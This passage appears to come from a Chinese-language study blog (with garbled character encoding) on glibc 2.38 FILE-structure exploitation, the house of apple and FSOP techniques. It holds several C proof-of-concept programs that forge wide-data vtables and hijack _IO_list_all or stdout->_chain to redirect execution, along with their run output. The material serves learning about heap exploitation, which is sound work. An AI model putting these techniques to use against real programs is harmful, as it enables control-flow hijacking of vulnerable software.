class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.ä¿®æ”¹FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.ä¿®æ”¹FILE.vtableæŒ‡å‘3ä¸­æ³„éœ²çš„_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.ä¿®æ”¹FILE._wide_dataæŒ‡å‘2ä¸­æ„é€ çš„fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.trigger house of apple</span></span><br><span class="line">    fwrite(buffer,<span class="number">1</span>,<span class="number">100</span>,fp);</span><br><span class="line"></span><br><span class="line">    fclose(fp); </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åŸºäº<code>glibc2.38</code>åšå®éªŒ,<code>win</code>å‡½æ•°è¢«è°ƒç”¨äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">â””â”€# gcc apple.c -o apple -g -no-pie -w</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">â””â”€# ./apple</span><br><span class="line">function printf @ 0x7f7e72eba110</span><br><span class="line">_IO_wfile_jumps @ 0x7f7e7303b268</span><br><span class="line">function win called</span><br></pre></td></tr></table></figure>







<h3 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h3><p>ä¸Šé›†è¯´åˆ°,<code>house of apple</code>åœ¨æ„é€ å¥½äº†<code>FILE</code>ä¹‹å,è¿˜è¦å¯¹å…¶è¿›è¡Œä¸€ä¸ª<code>fwrite</code>ç­‰æ“ä½œè§¦å‘åˆ°<code>_IO_wfile_overflow</code>å‡½æ•°</p>
<p>åœ¨æœ¬é›†ä¸­,<strong>ä¸éœ€è¦</strong>è°ƒç”¨<code>fwrite</code>ç­‰æ“ä½œ,ä¹Ÿå¯ä»¥è§¦å‘,ç›¸å…³æ”»å‡»æ–¹å¼å«åš<code>FSOP(File Structure Oriented Programming)</code></p>
<p>ç¨‹åºé€€å‡ºæ—¶,ä¼šæœ‰è¿™ä¹ˆä¸€æ¡è°ƒç”¨é“¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">exit</span><br><span class="line">	_run_exit_handlers</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all</span><br><span class="line">				_IO_OVERFLOW</span><br><span class="line">					vtable + 0x18 =&gt; _IO_file_overflow</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª<code>_IO_flush_all</code>ä¸­ä¼šæŠŠ<code>_IO_list_all</code>ä¸ŠæŒ‚ç€çš„éƒ½å°è¯•ä¸€ä¸‹<code>_IO_OVERFLOW</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">   &#123;</span><br><span class="line">     run_fp = fp;</span><br><span class="line">     _IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">     _IO_funlockfile (fp);</span><br><span class="line">     run_fp = <span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œèƒ½å¤Ÿæ‰§è¡Œ<code>_IO_OVERFLOW</code>çš„æ¡ä»¶æ˜¯ä¸‹å¼ä¸ºçœŸ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) </span><br><span class="line">|| </span><br><span class="line">(</span><br><span class="line">    _IO_vtable_offset(fp) == <span class="number">0</span> </span><br><span class="line">    &amp;&amp;</span><br><span class="line">    fp-&gt;_mode &gt; <span class="number">0</span> </span><br><span class="line">    &amp;&amp; </span><br><span class="line">    (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>ç¿»è¯‘æˆäººè¯å°±æ˜¯ä¸‹é¢ä¸¤æ¡<strong>æœ‰ä¸€æ¡ä¸ºçœŸ</strong>å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.å¦‚æœfp-&gt;_mode&lt;=0,è¿˜éœ€è¦æ»¡è¶³fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">2.å¦‚æœfp-&gt;_mode&gt; 0,è¿˜éœ€è¦æ»¡è¶³fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure>



<p>å¦‚æœèƒ½å¤Ÿä½¿ç”¨<code>house of apple</code>çš„æ–¹æ³•,</p>
<p><strong>ä½¿å¾—çš„<code>vtable</code>æŒ‡å‘<code>_IO_wfile_jumps</code>,ç„¶åæ„é€ <code>wide_data</code>,å¹¶ä½¿å…¶<code>wide_vtable</code>æŒ‡å‘å‡çš„è™šè¡¨,å‡è¡¨ç›¸åº”ä½ç½®å¡«å……<code>win</code>å‡½æ•°åœ°å€</strong></p>
<p><strong>ç„¶åå°†è¿™ä¸ªFILEæŒ‚åˆ°<code>_IO_list_all</code>é“¾ä¸Š</strong></p>
<p>å°±å¯ä»¥è°ƒç”¨åˆ°<code>win</code>å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br><span class="line">	_run_exit_handlers</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all</span><br><span class="line">				_IO_OVERFLOW</span><br><span class="line">					vtable + <span class="number">0x18</span> =&gt; _IO_wfile_overflow</span><br><span class="line">						_IO_wdoallocbuf</span><br><span class="line">							_IO_WDOALLOCATE</span><br><span class="line">    							wide_data.wide_vtable  + <span class="number">0x68</span> =&gt; win</span><br></pre></td></tr></table></figure>

<p>å†™ä¸€ä¸ªpocæ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    FILE * fake_fp;</span><br><span class="line">    <span class="type">size_t</span> * libc_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_list_all_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_data;</span><br><span class="line">    <span class="type">size_t</span> * vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span> * wide_data_ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.</span></span><br><span class="line">    <span class="comment">//æ³„éœ²libcåŸºå€,æ³„éœ²IO_wfile_jumpsåœ°å€,æ³„éœ²IO_list_allåœ°å€</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf addr = %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;</span><br><span class="line">    IO_list_all_addr = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d74c0</span>;</span><br><span class="line">    IO_wfile_jumps = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_addr = %p\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_list_all_addr = %p\n&quot;</span>, IO_list_all_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_wfile_jumps = %p\n&quot;</span>, IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.</span></span><br><span class="line">    <span class="comment">//æ„é€ fake_wide_vtable</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i] = win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.</span></span><br><span class="line">    <span class="comment">//æ„é€ fake_wide_data</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.</span></span><br><span class="line">    <span class="comment">//æ„é€ fake_fp</span></span><br><span class="line">    fake_fp = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_fp,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">    fake_fp -&gt; _flags =  ~(<span class="number">0x800</span> | <span class="number">0x8</span> |<span class="number">0x2</span>); </span><br><span class="line">    fake_fp -&gt; _mode = <span class="number">0</span>;</span><br><span class="line">    fake_fp -&gt; _IO_write_ptr = <span class="number">1</span>;</span><br><span class="line">    fake_fp -&gt; _IO_write_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fake_fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = IO_wfile_jumps;</span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fake_fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_fp @ %p\n&quot;</span>, fake_fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;orignal _IO_list_all points to %p\n&quot;</span>, *IO_list_all_addr);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//5.fake_fpä¸Šé“¾_IO_list_all</span></span><br><span class="line">    *IO_list_all_addr = fake_fp;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;new _IO_list_all points to %p\n&quot;</span>, *IO_list_all_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.</span></span><br><span class="line">    <span class="comment">//return and trigger win</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">â””â”€# gcc fsop1.c -o fsop1 -w</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">â””â”€# ./fsop1</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> addr = 0x7fb0bbddc110</span><br><span class="line">libc_addr = 0x7fb0bbd88000</span><br><span class="line">IO_list_all_addr = 0x7fb0bbf5f4c0</span><br><span class="line">IO_wfile_jumps = 0x7fb0bbf5d268</span><br><span class="line">fake_fp @ 0x55fbae0cc8d0</span><br><span class="line">orignal _IO_list_all points to 0x7fb0bbf5f4e0</span><br><span class="line">new _IO_list_all points to 0x55fbae0cc8d0</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>



<p>å¦‚æœèƒ½å¤Ÿæ§åˆ¶<code>fopen</code>å¹¶ä¸”ä¸<code>fclose</code>å…³é—­èµ„æºåˆ™æ›´ç®€å•,</p>
<p><code>fopen</code>ä¼šè‡ªåŠ¨è®©å‡<code>fp</code>ä¸Šé“¾,</p>
<p>ä¸<code>fclose</code>çš„è¯<code>fp</code>å°±ä¸ä¼šä¸‹é“¾,</p>
<p>å› æ­¤æ­¤æ—¶ç¨‹åºé€€å‡º,ä¹Ÿå¯ä»¥è§¦å‘</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span> * libc_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_list_all;</span><br><span class="line">    <span class="type">size_t</span> * IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_data;</span><br><span class="line">    <span class="type">size_t</span> * vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span> * wide_data_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.æ³„éœ²libcåŸºåœ°å€,æ³„éœ²IO_wfile_jumpsåœ°å€</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf addr = %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;</span><br><span class="line">    IO_wfile_jumps = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_addr = %p\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_wfile_jumps = %p\n&quot;</span>, IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.æ„é€ fake_wide_vtable</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i] = win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.æ„é€ fake_wide_data</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.fopenæ‰“å¼€çš„FILEå¯¹è±¡,ä¼šè‡ªåŠ¨æŒ‚åˆ°IO_list_allä¸Š,çœå»äº†æˆ‘ä»¬æ³„éœ²IO_list_allå¹¶ä¿®æ”¹å…¶å€¼çš„æ­¥éª¤</span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> |<span class="number">0x2</span>);</span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_write_ptr = <span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_base = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//ä¿®æ”¹vtableå’Œwide_data.wide_vtable</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = IO_wfile_jumps;</span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//fclose(fp);   å¦‚æœfcloseæ‰§è¡Œåˆ™fpä¼šä»IO_list_allä¸­åˆ é™¤,å› æ­¤ä¸èƒ½æ‰§è¡Œ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.return and trigger win</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">â””â”€# gcc fsop.c -o fsop -w</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">â””â”€# ./fsop</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> addr = 0x7f218fb94110</span><br><span class="line">libc_addr = 0x7f218fb40000</span><br><span class="line">IO_wfile_jumps = 0x7f218fd15268</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>



<p>ä¹Ÿå¯ä»¥é€šè¿‡ä¿®æ”¹<code>stdout-&gt;_chain</code>æŒ‡å‘å‡<code>FILE</code>å®ç°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;function win called&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;function win called\n&quot; );</span></span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.æ³„éœ²libcåŸºåœ°å€,è®¡ç®—å¾—åˆ°_IO_wfile_jumpsè¡¨çš„åœ°å€</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.æ„é€ fake_wide_vtable,ä½¿ç”¨winå¡«å……</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=_IO_wfile_jumps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fake_wide_vtable[<span class="number">13</span>] = (<span class="type">size_t</span>)win;</span><br><span class="line">    <span class="comment">//2.æ„é€ fake_wide_data,ä½¿å¾—å…¶åç§»0xe0å¤„çš„_wide_vtableæŒ‡é’ˆ,æŒ‡å‘1ä¸­æ„é€ çš„fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.ä¿®æ”¹FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_ptr =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end =0;</span></span><br><span class="line">    fp-&gt;_IO_write_ptr =<span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_end 